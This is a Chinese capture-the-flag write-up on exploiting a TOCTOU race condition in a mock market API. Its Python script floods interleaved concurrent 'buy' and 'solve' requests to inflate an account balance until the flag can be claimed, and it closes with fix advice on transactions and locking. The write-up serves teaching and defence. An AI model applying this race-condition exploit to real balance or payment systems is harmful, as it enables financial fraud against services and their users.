# Cosmos 的二手市场

## 题目简述

市场接口把购买商品、求购回收和余额更新拆成了彼此独立的读写操作，没有事务或锁。单次请求的金额检查看似正常，但并发执行 `buy` 与 `solve` 可以让多个请求基于同一份旧状态通过校验，再重复写入收益，最终把账户余额刷到取 flag 所需的数值。

## 解题过程

使用题目给出的账户登录：

```text
username: roc
password: 123456
```

目标商品编号为 `800001`。先调用 `getinfo` 观察账户的 `money` 与商品 `properties[0].amount`，再同时发起多组购买和求购完成请求。关键不是顺序循环，而是让两类请求在检查和更新之间重叠：

```python
from concurrent.futures import ThreadPoolExecutor
import requests

session = requests.Session()
base = "http://target/api.php"
item = "800001"

def invoke(method, amount):
    return session.post(base, data={
        "method": method,
        "code": item,
        "amount": amount,
    }).text

for round_id in range(1000):
    info = session.post(base, data={"method": "getinfo"}).json()
    money = int(info["money"])

    if money > 100_000_000:
        print(session.post(base, data={"method": "getflag"}).text)
        break

    if round_id % 2 == 0:
        amount = int(info["properties"][0]["amount"])
    else:
        amount = money // 10_000

    amount = max(1, min(amount, 500))

    with ThreadPoolExecutor(max_workers=30) as pool:
        futures = []
        for index in range(30):
            method = "solve" if index % 2 == 0 else "buy"
            futures.append(pool.submit(invoke, method, amount))
        for future in futures:
            future.result()
```

交替调整 `amount` 是为了在持有量和现金之间保持可继续利用的状态；上限 `500` 则避免一次请求超过接口限制。并发窗口命中后，余额的增长速度会明显超出正常交易。达到 `100000000` 后调用 `getflag` 即可。

## 方法总结

- 核心漏洞：余额检查、库存检查与状态更新不是原子操作，形成典型的 TOCTOU 条件竞争。
- 关键技巧：在同一账户上并发交错 `buy` 和 `solve`，而不是只对单一接口盲目重放。
- 修复方向：数据库事务、行级锁或原子条件更新必须覆盖“校验到写回”的整个临界区，并为业务请求增加幂等约束。
